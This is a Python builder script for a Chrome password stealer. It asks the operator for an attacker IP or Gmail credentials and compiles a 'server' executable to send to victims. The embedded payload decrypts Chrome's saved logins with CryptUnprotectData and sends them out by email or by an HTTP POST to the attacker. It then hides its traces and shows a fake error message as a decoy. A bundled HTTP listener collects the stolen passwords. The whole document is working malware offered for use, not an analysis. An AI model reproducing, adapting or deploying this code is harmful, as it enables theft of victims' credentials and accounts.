# -*- coding: utf-8 -*-
"""Creates an Executable that decrypts and sends Chrome passwords

This script will make use of py2exe to create an executable
version of itself, after gathering the input from the user.
The executable's functionality is to decrypt Google Chrome
saved passwords and sending them as a text file to an attacker
through reverce HTTP connection or email.

Note: To include a custom icon, the 'icon.ico' file in the directory
must be replaced by the desired one.
"""
import os
import sys
import time
from distutils.core import setup
from shutil import rmtree

import py2exe
from win32con import MB_OKCANCEL

__author__ = "Mario Nascimento"
__license__ = "GPL"
__version__ = "3.9.9"
__maintainer__ = "Mario Nascimento"
__email__ = "marionascimento@itsec.us"
__status__ = "Development"

attacker_ip = ""
loop = True
error = "0"
email = ""
pwd = ""
mailto = ""
serverlineStart = 212
serverlineStop = 323
while loop:
    os.system("cls")
    print(
        f"""You are using V{__version__}\n
    Choose how you want the passwords delivered\n
    (1) - [Buggy atm] via email (only Gmail supported, example@gmail.com.
        (Make sure you turn on 'allow less secure apps')\n
    (2) - via the client.exe (to your computer directly)\n
    """
    )
    option = input("\nChoose a number [1-2]: ")
    if option == "1":
        appname = "server_email"
        email = input("Input your Gmail address: ")
        pwd = input("Input your Gmail password: ")
        mailto = input(
            "Input the email you want to send the passwords to. \
Leave black to send it to yourself: "
        )
        if not mailto:
            mailto = email
        loop = False
    elif option == "2":
        appname = "server_ip"
        attacker_ip = input("IP for revrse connection: ")
        loop = False

    else:
        input(
            "You must choose a value between 1 and 2. \
Enter any key to try again.."
        )


while not loop:
    error = input(
        "Do you want the server to \
display a fake Error message? [Y/N]: "
    )
    if error.lower() == "y" or error.lower() == "yes":
        error = input("Enter a custom message or leave empty for default: ")
        if error is None:
            error = "1"
        os.system("cls")
        print(
            "Well done!\nThe server will be created shortly.\n\
Don't close this window"
        )
        time.sleep(2)
        loop = True

    elif error.lower() == "n" or error.lower() == "no":
        error = "0"
        os.system("cls")
        print(
            "Well done!\nThe server will be created shortly.\n\
Don't close this window"
        )
        time.sleep(2)
        loop = True
    else:
        input(
            "You must choose either Y or N. \
Enter any key to try again.."
        )


def done():
    os.system("cls")
    if option != "1":
        print(
            "\nClient has been created as 'client.exe'\n"
            + "Remember: Open this one before sending the server to the victim"
        )
    print(f"\nServer has been created as '{appname}'.exe")
    print(f"Remember: You send the '{appname}'.exe to the victim!")
    input("Press Enter to continue...")
    exit()


def py2crypt(filename):
    sys.argv.append("py2exe")
    if filename == "client.py":
        setup(
            options={
                "py2exe": {
                    "bundle_files": 1,
                    "excludes": [
                        "pyreadline",
                        "difflib",
                        "doctest",
                        "optparse",
                        "pickle",
                    ],
                    "dll_excludes": ["msvcr71.dll", "Crypt32.dll"],
                    "compressed": True,
                    "optimize": 2,
                }
            },
            console=[{"script": filename,
                      "icon_resources": [(0, "icon.ico")]}],
            zipfile=None,
        )

        if os.path.exists("client.exe"):
            os.remove("client.exe")
        os.rename("dist/client.exe", "client.exe")
    else:
        setup(
            options={
                "py2exe": {
                    "bundle_files": 1,
                    "excludes": [
                        "pyreadline",
                        "difflib",
                        "doctest",
                        "optparse",
                        "pickle",
                    ],
                    "dll_excludes": ["msvcr71.dll", "Crypt32.dll"],
                    "compressed": True,
                    "optimize": 2,
                }
            },
            windows=[
                {
                    "script": filename,
                    "icon_resources": [(0, "icon.ico")],
                    "dest_base": appname,
                }
            ],
            zipfile=None,
            #  'uac_info': "requireAdministrator"
        )
        if os.path.exists(appname + ".exe"):
            os.remove(appname + ".exe")
        os.rename("dist/" + appname + ".exe", appname + ".exe")
        # rmtree("build/")
        rmtree("dist/")


with open("create_server.py") as f1:
    with open("server.py", "w") as f2:
        lines = f1.readlines()
        i = serverlineStart
        f2.write(
            f"# -*- coding: utf-8 -*-\n\
attacker_ip = '{attacker_ip}'\n\
option = '{option}'\n\
email = '{email}'\n\
pwd = '{pwd}'\n\
mailto = '{mailto}'\n\
error = u'{error}'\n"
        )
        while i < serverlineStop - 1:
            f2.write(lines[i])
            i = i + 1
    if option != "1":
        with open("client.py", "w") as f3:
            i += 1
            while i < len(lines) - 1:
                f3.write(lines[i])
                i = i + 1
        py2crypt("client.py")
        print("[+] Client done building... \n[+] Building server...\n")
    time.sleep(3)
    py2crypt("server.py")
    try:
        # pass
        os.remove("server.py")
        os.remove("client.py")
    except Exception as err:
        pass
    done()

"""
import ctypes, smtplib, os, win32crypt, time, urllib, requests, queue
from shutil import copyfile
from subprocess import check_call
from sqlite3 import connect
from requests import get, post
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


destination = "error.txt"
def getpass():

    path = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"

    path2 = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login2"

    ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32, 126)]) + '_'*130
    path = path.strip()
    path = urllib.parse.unquote(path)
    if path.translate(ASCII_TRANS) != path:  # Contains non-ascii
        path = path.decode('latin-1')
    path = urllib.request.url2pathname(path)

    ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32, 126)]) + '_'*130
    path2 = path2.strip()
    path2 = urllib.parse.unquote(path2)
    if path2.translate(ASCII_TRANS) != path2:  # Contains non-ascii
        path2 = path2.decode('latin-1')
    path2 = urllib.request.url2pathname(path2)
    try:
        copyfile(path, path2)
    except:
        pass

    conn = connect(path2)

    cursor = conn.cursor()

    cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')

    if os.path.exists(destination):
        os.remove(destination)

    sites = []
    for raw in cursor.fetchall():
        try:
            if raw[0] not in sites:
                if os.path.exists(destination):
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + 
                                       win32crypt.CryptUnprotectData(raw[2])[1].decode("utf-8") + '\n')
                else:
                    with open(destination, "w") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + 
                                       win32crypt.CryptUnprotectData(raw[2])[1].decode("utf-8") + '\n')
                sites.append(raw[0])
        except:
            continue

    conn.close()
    return 0





def sendpass():
    if option == "1":
        server = "smtp.gmail.com"
        msg = MIMEMultipart()
        filename = destination
        f = open(filename)
        attachment = MIMEText(f.read())
        f.close()
        attachment.add_header('Content-Disposition',
                              'attachment', filename=destination)
        msg.attach(attachment)

        mailer = smtplib.SMTP(server, 587)
        mailer.starttls()
        mailer.login(email, pwd)
        mailer.sendmail(email, mailto, msg.as_string())
        mailer.close()

    else:
        try:
            path = destination
            url = 'http://' + attacker_ip
            files = {'file': open(path, 'rb')}
            r = post(url, files=files)
        except:
            pass
        return 0
getpass()
sendpass()
try:
    os.remove(destination)
except:
    check_call(["attrib","+H",destination])
MB_OK = 0x00
MB_ICONSTOP = 0x10
if error == "1":
    ctypes.windll.user32.MessageBoxW(
        None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
if error != "1" and error != "0":
    ctypes.windll.user32.MessageBoxW(None, error, u'Error', MB_OK | MB_ICONSTOP)

import os
import cgi
import http.server
import urllib.parse as urlparse

host = "0.0.0.0"
port = 80


class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        return

    def do_POST(self):
        destination = "passwords.txt"
        add = 1
        self.send_response(200)
        if self.rfile:
            print(
                "\n\nEstablished connection from "
                + self.client_address[0]
                + " ("
                + str(self.client_address[1])
                + " -> "
                + str(port)
                + ")"
            )
            if os.path.isfile(destination):
                exist = True
                while exist:
                    try:
                        if not os.path.isfile("passwords" + str(add) + ".txt"):
                            exist = False
                            destination = "passwords" + str(add) + ".txt"
                            break
                        add += 1
                    except Exception as err:
                        pass
            with open(destination, "wb") as pfile:
                for key, value in dict(
                    urlparse.parse_qs(
                        self.rfile.read(int(self.headers["Content-Length"]))
                    )
                ).items():
                    for i in value:
                        pfile.write(i)
            print(
                "Retrieved passwords from "
                + self.client_address[0]
                + " into "
                + destination
                + "\n"
            )

    def log_message(self, format, *args):
        return


def run(server=http.server.HTTPServer, handler=MyHandler):
    server_address = (host, port)
    httpServ = server(server_address, handler)
    try:
        print("Waiting for connections...\n")
        httpServ.serve_forever()
    except KeyboardInterrupt:
        print("[!] Server is terminated")
        httpServ.server_close()


if __name__ == "__main__":
    run()
"""
